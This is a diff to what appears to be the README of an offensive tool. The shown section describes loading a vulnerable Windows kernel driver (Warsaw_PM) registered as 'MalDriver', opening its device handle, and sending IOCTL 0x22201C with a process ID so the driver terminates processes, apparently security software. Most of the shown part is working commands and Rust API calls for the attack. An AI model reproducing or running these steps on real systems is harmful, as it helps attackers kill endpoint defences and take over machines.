@@ -28,19 +28,22 @@ Any sane threat actor will naturally prioritize this capability to terminate cri
 
 ### 1. Register a service:
 Launch cmd.exe with Administrator privileges, and register a kernel driver service with type "kernel" and binPath pointing to the vulnerable driver's location.
+```
+> sc create MalDriver binPath= <path> type= kernel`
+> sc start MalDriver
 
-`> sc create MalDriver binPath= <path> type= kernel`
-`> sc start MalDriver`
+```
 
 Once loaded, the driver creates a symbolic link for user-mode accessible as \\.\Warsaw_PM. Which we can use to get a handle to the driver device using the CreateFileW API call.
 
-`CreateFileW(device_name.as_ptr(), GENERIC_READ | GENERIC_WRITE, 0, ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut())`
-
+```
+> CreateFileW(device_name.as_ptr(), GENERIC_READ | GENERIC_WRITE, 0, ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut())
+```
 
 To send the Malicious IOCTLs we will use DeviceIoControl with code 0x22201C, and buffer containing a PID in its first 4 bytes
-
-`DeviceIoControl(self.hDriver, 0x22201C, buffer.as_mut_ptr() as LPVOID, buffer.len(), ptr::null_mut(), 0, &mut bytes_returned, ptr::null_mut())`
-
+```
+> DeviceIoControl(self.hDriver, 0x22201C, buffer.as_mut_ptr() as LPVOID, buffer.len(), ptr::null_mut(), 0, &mut bytes_returned, ptr::null_mut())
+```
 
 
 
